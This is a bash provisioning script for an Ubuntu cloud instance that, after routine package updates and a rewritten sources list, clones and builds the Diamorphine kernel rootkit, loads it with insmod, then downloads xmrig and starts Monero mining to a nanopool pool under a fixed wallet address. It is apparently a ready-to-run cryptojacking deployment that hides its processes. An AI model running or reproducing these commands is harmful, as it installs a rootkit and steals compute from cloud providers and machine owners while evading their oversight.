sudo DEBIAN_FRONTEND=noninteractive apt update && sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y && sudo DEBIAN_FRONTEND=noninteractive apt install gnupg -y && 

sudo rm -rf /etc/apt/sources.list && 
sudo bash -c 'cat <<EOF > /etc/apt/sources.list
## Note, this file is written by cloud-init on first boot of an instance
## modifications made here will not survive a re-bundle.
## if you wish to make changes you can:
## a.) add apt_preserve_sources_list: true to /etc/cloud/cloud.cfg
##     or do the same in user-data
## b.) add sources in /etc/apt/sources.list.d
## c.) make changes to template file /etc/cloud/templates/sources.list.tmpl

# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to
# newer versions of the distribution.
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy main restricted
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy main restricted

## Major bug fix updates produced after the final release of the
## distribution.
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-updates main restricted
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-updates main restricted

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team. Also, please note that software in universe WILL NOT receive any
## review or updates from the Ubuntu security team.
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy universe
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy universe
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-updates universe
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-updates universe

## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team, and may not be under a free licence. Please satisfy yourself as to
## your rights to use the software. Also, please note that software in
## multiverse WILL NOT receive any review or updates from the Ubuntu
## security team.
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy multiverse
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy multiverse
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-updates multiverse
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-updates multiverse

## N.B. software from this repository may not have been tested as
## extensively as that contained in the main release, although it includes
## newer versions of some applications which may provide useful features.
## Also, please note that software in backports WILL NOT receive any review
## or updates from the Ubuntu security team.
deb http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-backports main restricted universe multiverse
# deb-src http://nova.clouds.archive.ubuntu.com/ubuntu/ jammy-backports main restricted universe multiverse

deb http://security.ubuntu.com/ubuntu jammy-security main restricted
# deb-src http://security.ubuntu.com/ubuntu jammy-security main restricted
deb http://security.ubuntu.com/ubuntu jammy-security universe
# deb-src http://security.ubuntu.com/ubuntu jammy-security universe
deb http://security.ubuntu.com/ubuntu jammy-security multiverse
# deb-src http://security.ubuntu.com/ubuntu jammy-security multiverse
EOF' && 
sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 871920D1991BC93C && 
sudo DEBIAN_FRONTEND=noninteractive apt update && 
sudo DEBIAN_FRONTEND=noninteractive apt upgrade -y && 
sudo DEBIAN_FRONTEND=noninteractive apt-get install zip p7zip-full unzip git htop tmux cpulimit build-essential tmux -y && 
##sudo DEBIAN_FRONTEND=noninteractive apt-get remove -y linux-image-6.1.0-21-cloud-amd64 linux-image-6.1.0-22-cloud-amd64 linux-image-cloud-amd64 && 

##sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-107 -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-113 -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-headers-virtual -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-image-virtual -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-modules-5.15.0-107-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-modules-5.15.0-113-generic -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install linux-virtual -y && 
cd && 
#wget 2.sh && 
##rm ./1.sh && 
##sudo DEBIAN_FRONTEND=noninteractive update-grub && sudo reboot now


git clone https://github.com/OverloadedOpRK/Diamorphine && 
cd Diamorphine && 
sudo make && 
sudo insmod diamorphine.ko && 
wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz &&
tar -xf xmrig-6.21.3-noble-x64.tar.gz && 
cd xmrig-6.21.3 && 
rm config.json && 
#wget https://ftp.gnu.org/gnu/glibc/glibc-2.38.tar.gz && 
#tar xzf glibc-2.38.tar.gz && 
#cd glibc-2.38 && 
#mkdir build && 
#cd build && 
#../configure --prefix=/usr/local/glibc-2.38 && 
#make && sudo make install && 
./xmrig -o xmr-eu1.nanopool.org:14433 -u 48wKerdf8HaKCgAfh8ACanFBHTa7Td7oQTdTty5gm4vnfvAhdV2cJHtCNwuZDVwKPH448uasLzjZwWsyFqjCW7BWL5Z3zez --tls --coin monero
